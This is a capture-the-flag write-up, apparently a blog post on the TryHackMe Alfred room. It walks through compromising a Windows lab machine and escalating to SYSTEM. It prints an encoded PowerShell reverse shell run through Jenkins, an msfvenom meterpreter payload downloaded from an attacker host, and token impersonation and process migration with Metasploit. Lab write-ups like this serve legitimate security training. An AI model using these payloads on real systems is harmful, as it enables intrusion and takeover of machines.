---
layout: post
title: "Windows Privilage Escalation"
date: 2025-07-14 00:00:00 +0100
categories: [thm, hacking, windows]
tags: [windows privilege escalation, post-exploitation, metasploit, msfvenom, meterpreter, ctf]
---

![win-priv-esc](pics/win-priv-esc.png)

### Intro

Today I tackled the Alfred room on TryHackMe - an engaging Windows-based challenge that dives deep into privilege escalation tactics. Whether you're prepping for certifications or just sharpening your red team skills, this room offers practical, hands-on insight into exploiting misconfigurations and escalating access within Windows environments. Below are some notes and reflections I gathered from the experience.

### Enumeration

- Using nmap I checked for open ports:

```bash
nmap -sC -sV -v -Pn 10.10.44.28 -oN nmap_alfred.txt
```

- On one of the ports there was a Jenkins service(what a surprize ;D )
- After checking it I noticed that we have a project from which I can run commands

### Exploitation

- On my attack machine I started listener:

```bash
nc -lvnp 1337
```

- Since it was a windows machine, I get some Powershell payload from the great **https://www.revshells.com/** (*Powershell#3Base64*) and run it from Jenkins project:

```shell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

- Collected user flag and after that started thinking about privilege escalation, on linux it is easier to do it manually from the shell itself, but on windows situation looks not the same ...

### Switching shells and Post-Exploitation (That's what are you looking for!)

- Let's go back to our attack machine and prepare some payload using **msfvenom**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o shell.exe
```

- After creating payload let's put it on our victim machine:

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('<ATTACKER-IP>:4444/shell.exe','shell.exe')"
```

- Prepare *metasploit* to catch a shell:

```bash
$ msfconsole

# prepare handler
$ use exploit/multi/handler

# check and setup options we need
$ set PAYLOAD windows/meterpreter/reverse_tcp
$ set LHOST <ATTACKER-IP>
$ set LPORT <PORT>

$ run
```

- Start our attack payload from victim machine:

```shell
Start-Process "shell.exe"
```

- !NB! the most commonly abused privileges

(more here -> *https://www.exploit-db.com/papers/42556*):

```
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

- Check all the privileges (You can see that two privileges - *SeDebugPrivilege* and *SeImpersonatePrivilege* are enabled.):

```shell
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

- Let's use the incognito module that will allow us to exploit this vulnerability.

```shell
meterpreter > load incognito
Loading extension incognito...Success.
```

- Check which tokens are available (We can see that the BUILTIN\Administrators token is available):

```shell
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

- To impersonate the Administrators' token:

```shell
meterpreter > impersonate_token "BUILTIN\\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

- Let's check a username now:

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- Great, we have the permissions of a privileged user!

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe # That's what we need!
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
...
```

-  Let's migrate to another process (The safest process to pick is the *services.exe* process) since we need one with correct permissions:

```shell
meterpreter > migrate 668
[*] Migrating from 1680 to 668...
[*] Migration completed successfully.
```

- Now just get a root flag from a config folder, that's all folks!